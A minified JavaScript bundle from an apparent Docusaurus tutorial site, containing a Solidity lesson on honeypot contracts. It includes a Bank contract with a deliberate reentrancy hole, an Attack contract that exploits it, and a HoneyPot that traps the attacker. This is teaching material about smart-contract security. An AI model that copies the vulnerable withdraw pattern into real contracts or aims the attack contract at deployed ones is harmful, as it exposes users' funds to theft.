"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[5290],{3905:function(n,e,t){t.d(e,{Zo:function(){return u},kt:function(){return m}});var r=t(7294);function a(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function o(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function i(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?o(Object(t),!0).forEach((function(e){a(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function c(n,e){if(null==n)return{};var t,r,a=function(n,e){if(null==n)return{};var t,r,a={},o=Object.keys(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||(a[t]=n[t]);return a}(n,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(a[t]=n[t])}return a}var l=r.createContext({}),s=function(n){var e=r.useContext(l),t=e;return n&&(t="function"==typeof n?n(e):i(i({},e),n)),t},u=function(n){var e=s(n.components);return r.createElement(l.Provider,{value:e},n.children)},p={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},d=r.forwardRef((function(n,e){var t=n.components,a=n.mdxType,o=n.originalType,l=n.parentName,u=c(n,["components","mdxType","originalType","parentName"]),d=s(t),m=a,g=d["".concat(l,".").concat(m)]||d[m]||p[m]||o;return t?r.createElement(g,i(i({ref:e},u),{},{components:t})):r.createElement(g,i({ref:e},u))}));function m(n,e){var t=arguments,a=e&&e.mdxType;if("string"==typeof n||a){var o=t.length,i=new Array(o);i[0]=d;var c={};for(var l in e)hasOwnProperty.call(e,l)&&(c[l]=e[l]);c.originalType=n,c.mdxType="string"==typeof n?n:a,i[1]=c;for(var s=2;s<o;s++)i[s]=t[s];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},6727:function(n,e,t){t.r(e),t.d(e,{contentTitle:function(){return l},default:function(){return d},frontMatter:function(){return c},metadata:function(){return s},toc:function(){return u}});var r=t(7462),a=t(3366),o=(t(7294),t(3905)),i=["components"],c={title:"Honeypot",version:"0.8.10",description:"An example of honeypot in Solidity"},l=void 0,s={unversionedId:"Example/HoneyPot",id:"Example/HoneyPot",isDocsHomePage:!1,title:"Honeypot",description:"An example of honeypot in Solidity",source:"@site/docs/Example/HoneyPot.md",sourceDirName:"Example",slug:"/Example/HoneyPot",permalink:"/rooctblog/docs/Example/HoneyPot",tags:[],version:"current",frontMatter:{title:"Honeypot",version:"0.8.10",description:"An example of honeypot in Solidity"},sidebar:"tutorialSidebar",previous:{title:"Hello World",permalink:"/rooctblog/docs/Example/Helloworld"},next:{title:"If / Else",permalink:"/rooctblog/docs/Example/IfElse"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]}],p={toc:u};function d(n){var e=n.components,t=(0,a.Z)(n,i);return(0,o.kt)("wrapper",(0,r.Z)({},p,t,{components:e,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"A honeypot is a trap to catch hackers."),(0,o.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,o.kt)("p",null,"Combining two exploits, reentrancy and hiding malicious code, we can build a contract"),(0,o.kt)("p",null,"that will catch malicious users."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nBank is a contract that calls Logger to log events.\nBank.withdraw() is vulnerable to the reentrancy attack.\nSo a hacker tries to drain Ether from Bank.\nBut actually the reentracy exploit is a bait for hackers.\nBy deploying Bank with HoneyPot in place of the Logger, this contract becomes\na trap for hackers. Let\'s see how.\n\n1. Alice deploys HoneyPot\n2. Alice deploys Bank with the address of HoneyPot\n3. Alice deposits 1 Ether into Bank.\n4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.\n5. Eve deploys Attack with the address of Bank\n6. Eve calls Attack.attack() with 1 Ether but the transaction fails.\n\nWhat happened?\nEve calls Attack.attack() and it starts withdrawing Ether from Bank.\nWhen the last Bank.withdraw() is about to complete, it calls logger.log().\nLogger.log() calls HoneyPot.log() and reverts. Transaction fails.\n*/\n\ncontract Bank {\n    mapping(address => uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, "Deposit");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount <= balances[msg.sender], "Insufficient funds");\n\n        (bool sent, ) = msg.sender.call{value: _amount}("");\n        require(sent, "Failed to send Ether");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, "Withdraw");\n    }\n}\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\n// Hacker tries to drain the Ethers stored in Bank by reentrancy.\ncontract Attack {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n// Let\'s say this code is in a separate file so that others cannot read it.\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, "Withdraw")) {\n            revert("It\'s a trap");\n        }\n    }\n\n    // Function to compare strings using keccak256\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}\n\n')))}d.isMDXComponent=!0}}]);